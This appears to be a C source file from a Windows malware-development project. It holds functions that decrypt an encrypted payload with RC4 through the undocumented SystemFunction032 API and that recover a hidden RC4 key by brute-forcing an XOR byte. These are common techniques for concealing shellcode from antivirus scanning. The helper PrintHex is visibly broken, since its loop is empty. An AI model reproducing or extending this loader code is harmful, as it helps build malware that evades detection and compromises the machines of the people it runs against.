#include <Windows.h>

#include "include/common.h"
#include "include/debug.h"
#include "include/structs.h"

// Add malloc macro
#define MALLOC(size) HeapAlloc(GetProcessHeap(), 0, (size))
#define FREE(ptr)   HeapFree(GetProcessHeap(), 0, (ptr))


BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {

	// the return of SystemFunction032
	NTSTATUS	STATUS = NULL;

	// making 2 USTRING variables, 1 passed as key and one passed as the block of data to encrypt/decrypt
	USTRING		Key = { .Buffer = pRc4Key, 		.Length = dwRc4KeySize,		.MaximumLength = dwRc4KeySize },
		Data = { .Buffer = pPayloadData, 	.Length = sPayloadSize,		.MaximumLength = sPayloadSize };


	// since SystemFunction032 is exported from Advapi32.dll, we use LoadLibraryA to load Advapi32.dll into the prcess, 
	// and using its return as the hModule parameter in GetProcAddress
    fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032");

	// if SystemFunction032 calls failed it will return non zero value 
	if ((STATUS = SystemFunction032(&Data, &Key)) != 0x0) {
		PRINTA("[!] SystemFunction032 FAILED With Error: 0x%0.8X \n", STATUS);
		return FALSE;
	}

	return TRUE;
}


BYTE BruteForceDecryption(IN BYTE HintByte, IN PBYTE pProtectedKey, IN SIZE_T sKey, OUT PBYTE* ppRealKey) {

    BYTE            b = 0;
    INT             i = 0;
    PBYTE           pRealKey = (PBYTE)MALLOC(sKey);

    if (!pRealKey)
        return NULL;

    while (1) {

        if (((pProtectedKey[0] ^ b) - i) == HintByte)
            break;
        else
            b++;
    }

    for (int i = 0; i < sKey; i++) {
        pRealKey[i] = (BYTE)((pProtectedKey[i] ^ b) - i);
    }

    *ppRealKey = pRealKey;
    return b;
}


void PrintHex(IN PBYTE pBuf, IN SIZE_T sSize) {
    for (SIZE_T i = 0; i < sSize; i++) {
    }
    PRINTA("\n\n");
}